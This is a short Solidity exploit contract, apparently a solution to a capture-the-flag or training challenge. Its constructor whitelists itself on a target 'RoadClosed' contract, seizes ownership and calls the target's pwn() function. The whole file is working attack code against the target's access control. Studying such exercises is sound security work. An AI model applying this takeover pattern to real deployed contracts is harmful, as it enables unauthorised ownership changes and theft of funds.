// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "./RoadClosed.sol";

contract AttackContract {
    RoadClosed public roadClosed;
    address public hacker;

    constructor(RoadClosed _roadClosed, address _hacker) {
        roadClosed = _roadClosed;
        hacker = _hacker;
        roadClosed.addToWhitelist(address(this));
        roadClosed.changeOwner(address(this));
        roadClosed.pwn(address(this));
    }
}